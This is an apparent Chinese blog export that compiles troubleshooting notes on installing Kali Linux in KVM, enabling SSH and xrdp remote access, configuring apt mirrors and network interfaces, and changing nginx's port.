KVM虚拟机的安装过程如下：</p>\n<ol>\n<li><p>安装好KVM虚拟机</p>\n</li>\n<li><p>在kali官网下载最新镜像</p>\n</li>\n</ol>\n<p><a href=\"https://www.kali.org/downloads/\">https://www.kali.org/downloads/</a></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/5ac032b0121d87190339416a069e677b.png\" alt=\"5ac032b0121d87190339416a069e677b.png\"></p>\n<p>\\3. 新建新的KVM虚拟机，根据宿主机的配置选择合适的<a href=\"https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020\">内存</a>和CPU设置，CD-ROM镜像选择下载的Kali Linux镜像，启动安装(根据向导步骤完成)</p>\n<p>\\4. 安装完成后，输入设定的用户名和密码(在向导过程中设定)， 进入系统界面</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/d2c0e50968d8e6353910988c6656aa89.png\" alt=\"d2c0e50968d8e6353910988c6656aa89.png\"></p>\n<p>\\5. 若需要对系统或网络设置，点击左侧工具栏中的，滚动页面，在页面中选择Settings, 在新的页面中，选中Network进行网络设置。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/64f52233aeacb905524621c43795fa01.png\" alt=\"64f52233aeacb905524621c43795fa01.png\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/a280efbb9840a387ecf84c763b6bf4a2.png\" alt=\"a280efbb9840a387ecf84c763b6bf4a2.png\"></p>\n<p>二、开启ssh远程登录</p>\n<p>Kali Linux默认未启动ssh Server， 可在后台ssh服务。</p>\n<p>\\1. 进入Terminal, 开启并使能ssh服务</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/0c409481273df270efe7e0d8ce6c72a1.png\" alt=\"0c409481273df270efe7e0d8ce6c72a1.png\"></p>\n<p>\\2. 新增用户，作为ssh登录账户</p>\n<p>Settings中选择Details, 选择Users, Add User</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/d00ee588d47bdbb67bb5a5d1a0413dfa.png\" alt=\"d00ee588d47bdbb67bb5a5d1a0413dfa.png\"></p>\n<p>三、组件更新</p>\n<p>新装系统未设置任何更新源，我们需要手动指定Kali系统的更新源</p>\n<p>在/etc/apt/sources.list文件中增加新的更新源， 如：</p>\n<p>deb <a href=\"http://mirrors.aliyun.com/kali\">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/1e1423db1d6d320a3efbfe3cdb2c0704.png\" alt=\"1e1423db1d6d320a3efbfe3cdb2c0704.png\"></p>\n<p>主要的更新源有：</p>\n<p>官网：</p>\n<p>deb <a href=\"http://http.kali.org/kali\">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>\n<p>deb-src <a href=\"http://http.kali.org/kali\">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>\n<p>注意：官网的更新源在国外，一般情况下需要设置代理才能访问(有时候，由于中间防火墙的缘故，经常出现500 Internal Privoxy Error错误，导致更新失败)， 设置代理的方法和简单，在Terminal中执行如下命令即可：</p>\n<p>export http_proxy=<a href=\"http://192.168.1.123:8080/\">http://192.168.1.123:8080/</a></p>\n<p>export https_proxy=https:// 192.168.1.123:8080</p>\n<p>国内镜像点：</p>\n<p>#阿里云</p>\n<p>deb <a href=\"http://mirrors.aliyun.com/kali\">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>\n<p>deb-src <a href=\"http://mirrors.aliyun.com/kali\">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>\n<p>#清华大学</p>\n<p>deb <a href=\"http://mirrors.tuna.tsinghua.edu.cn/kali\">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p>\n<p>deb-src <a href=\"https://mirrors.tuna.tsinghua.edu.cn/kali\">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p>\n<p>#浙大</p>\n<p>deb <a href=\"http://mirrors.zju.edu.cn/kali\">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>\n<p>deb-src <a href=\"http://mirrors.zju.edu.cn/kali\">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>\n<p>#163</p>\n<p>deb <a href=\"http://mirrors.163.com/debian/\">http://mirrors.163.com/debian/</a> jessie main non-free contrib</p>\n<p>deb <a href=\"http://mirrors.163.com/debian/\">http://mirrors.163.com/debian/</a> jessie-updates main non-free contrib</p>\n<p>设置镜像点后，执行更新(根据提示选择)</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/00024919bc03be1dde259f410c843366.png\" alt=\"00024919bc03be1dde259f410c843366.png\"></p>\n<p>三、安装远程桌面</p>\n<p>XRDP支持远程桌面连接。</p>\n<p>apt install xrdp</p>\n<p>按照提示完成安装，完成后，启用服务：</p>\n<p>systemctl enable xrdp</p>\n<p>systemctl start xrdp</p>\n<p>完成后，通过netstat检查3350端口是否监听</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/c6a505318e4cff32121e85f18e9c852d.png\" alt=\"c6a505318e4cff32121e85f18e9c852d.png\"></p>\n<p>Windows 10系统共同远程桌面，连接Kali Linux,如下图所示：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/img_convert/be7ae1ceed3a2f03bc9c95a4a239dc38.png\" alt=\"be7ae1ceed3a2f03bc9c95a4a239dc38.png\"></p>\n<h1 id=\"kali无法连接网络\"><a href=\"#kali无法连接网络\" class=\"headerlink\" title=\"kali无法连接网络\"></a>kali无法连接网络</h1><p><a href=\"https://www.jianshu.com/u/c6d743ce7424\"><img src=\"https://upload.jianshu.io/users/upload_avatars/13348817/d494b761-7b33-4f1f-be05-732322fe6486.jpg?imageMogr2/auto-orient/strip%7CimageView2/1/w/96/h/96/format/webp\" alt=\"img\"></a></p>\n<p><a href=\"https://www.jianshu.com/u/c6d743ce7424\">HAPPYers</a>关注</p>\n<p>查看ifconfig -a，发现eth0存在，但是没有工作</p>\n<p>打开/etc/network/interfaces，起初是没有最下面两行的，加上，格式是仿造倒数第三和第四这两行来写的<br>在行末加入</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">auto</span> eth0</span><br><span class=\"line\">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>\n\n<p>文本如下</p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/13348817-d7d5104c29fab0e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/690/format/webp\" alt=\"img\"></p>\n<p>最后，在terminal里执行 /etc/init.d/networking restart 重启网络，使刚才的配置生效，done。</p>\n<p>windows 远程桌面访问kali 之xrdp</p>\n<p>qq_19486585</p>\n<p>于 2020-11-17 14:30:27 发布</p>\n<p>2106<br>文章标签： 经验分享 其他<br>版权<br>环境：Esxi6.5</p>\n<pre><code>   kali2020.3虚拟机和靶机\n   windows:虚拟机或物理机\n   同一lan内\n</code></pre>\n<p>1<br>2<br>3<br>系统：</p>\n<pre><code>1）kali 2020.3\n2）windows 10 v20h2\n</code></pre>\n<p>1<br>2<br>一、Kali配置</p>\n<p>安装软件<br>#apt-get install xrdp<br>安装xrdp时，提示“无法定位软件包 xrdp”时。更换一下镜像源<br>#vim /etc/apt/source.list</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201117135919123.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>#apt-get install xfce4</p>\n<p>编辑配置文件<br>#vim /etc/xrdp/xrdp.ini<br>max_bpp=32 修改为16<br>[Xvnc]栏<br>ip=0.0.0.0</p>\n<p>#vim /etc/xrdp/startwm.sh<br>添加下图红框一条配置</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201117135454580.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>启动<br>#service xrdp restart<br>#update-rc.d xrdp enable</p>\n<p>二、windows 10远程访问<br>运行mstsc—–kali的ip地址<br>session使用xorg服务， 也可以安装VNC服务器登录但我没安装vnc；<br>输入root账号和密码， 经测试非root账号会闪退；</p>\n<p><strong><img src=\"https://img-blog.csdnimg.cn/20201117141741969.png#pic_center\" alt=\"在这里插入图片描述\"></strong></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201117141827414.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"对Kali-Linux进行SSH远程控制\"><a href=\"#对Kali-Linux进行SSH远程控制\" class=\"headerlink\" title=\"对Kali Linux进行SSH远程控制\"></a>对Kali Linux进行SSH远程控制</h1><p>默认情况下，Kali Linux2并没有开始SSH服务，如果要远程使用SSH服务连接到Kali还需要一定的设置。</p>\n<p>1、首先打开SSH所在目录，命令如下：</p>\n<p>cd /etc/ssh/</p>\n<p>2、在这个文件夹中创建一个备份文件夹keys_backup，用来保存默认的密钥：</p>\n<p>mkdir keys_backup</p>\n<p>3、使用如下命令将默认的密钥移动到keys_backup文件夹中。</p>\n<p>mv ssh_host_* keys_backup</p>\n<p>4、使用如下命令重新创建一个新的密钥。</p>\n<p>dpkg-reconfigure openssh-server</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190527001528877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>5、修改sshd_config文件，该文件位于/etc/ssh/sshd_config，如下图：</p>\n<p>gedit sshd_config</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190527001838540.png\" alt=\"在这里插入图片描述\"></p>\n<p>6、接下来，在终端启动SSH服务，命令如下：</p>\n<p>/etc/init.d/ssh start</p>\n<p><img src=\"https://img-blog.csdnimg.cn/2019052700194696.png\" alt=\"在这里插入图片描述\"></p>\n<p>如果像查看SSH服务运行状态，可以使用如下命令：</p>\n<p>netstat -antp</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190527002127279.png\" alt=\"在这里插入图片描述\"></p>\n<p>可以看到SSH服务已经在22端口上运行起来了。</p>\n<p>7、查看自己kali的ip地址。</p>\n<p>ifconfig</p>\n<p><img src=\"https://img-blog.csdnimg.cn/2019052700235545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>8、最后可以使用PuTTY来完成远程登陆。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190527002556995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>输入账号和密码后即可远程控制你的kali，如下：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190527002459885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"解决kali无法连接网络问题\"><a href=\"#解决kali无法连接网络问题\" class=\"headerlink\" title=\"解决kali无法连接网络问题\"></a>解决kali无法连接网络问题</h1><p><img src=\"https://csdnimg.cn/release/blogv2/dist/pc/img/translate.png\" alt=\"img\"></p>\n<ol>\n<li>键入 ifconfig -a 查看网卡 ，是否存在</li>\n<li>键入 leafpad /etc/network/interfaces 查看其中是否有如下语句，没有添加上即可：<br>auto eth0<br>iface eth0 inet <a href=\"https://so.csdn.net/so/search?q=dhcp&spm=1001.2101.3001.7020\">dhcp</a></li>\n<li>然后重启：/etc/init.d/networking restart</li>\n<li>如果仍无法连接网络，重置虚拟网络：编辑–虚拟网络编辑器</li>\n<li>键入 leafpad /etc/NetworkManager/NetworkManager.conf 将其中的false改为true</li>\n<li>键入ifup eth0 启动网卡</li>\n</ol>\n<h1 id=\"更改nginx默认端口，ubuntu更改nginx端口号\"><a href=\"#更改nginx默认端口，ubuntu更改nginx端口号\" class=\"headerlink\" title=\"更改nginx默认端口，ubuntu更改nginx端口号\"></a>更改nginx默认端口，ubuntu更改nginx端口号</h1><p>我们都知道nginx 默认使用80端口，有时候我们希望nginx运行在其他端口，就需要更改nginx配置<br>nginx配置文件在/etc/nginx目录下的nginx.conf。在nginx.conf-&gt;http选项末尾有引入两个目录下的文件分别为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">        #   省略部分内容    </span><br><span class=\"line\">        include /etc/nginx/conf.d/*.conf;</span><br><span class=\"line\">        include /etc/nginx/sites-enabled/*;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们查看/etc/nginx/sites-enabled/目录，会找到一个default文件，在server选项下前两行就可以找到使用的80端口号：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen 80 default_server;</span><br><span class=\"line\">        listen [::]:80 default_server;</span><br></pre></td></tr></table></figure>\n\n<p>将80端口号改为想使用的端口号，保存文件，如果没有启动nginx，启动即可。如果nginx已经在运行，重新加载即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo nginx start #运行nginx</span><br><span class=\"line\">sudo nginx -s reload #重启nginx</span><br></pre></td></tr></table></figure>\n\n<p>如果遇到nginx报以下错误：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nginx: [error] open() &quot;/run/nginx.pid&quot; failed (2: No such file or directory)</span><br></pre></td></tr></table></figure>\n\n<p>sudo nginx -c path/.conf #指定nginx配置.conf的位置</p>\n<p>查看nginx运行端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo netstat -anp | grep nginx</span><br></pre></td></tr></table></figure>\n\n","categories":["troubleshooting"],"tags":["问题排除记录"]}]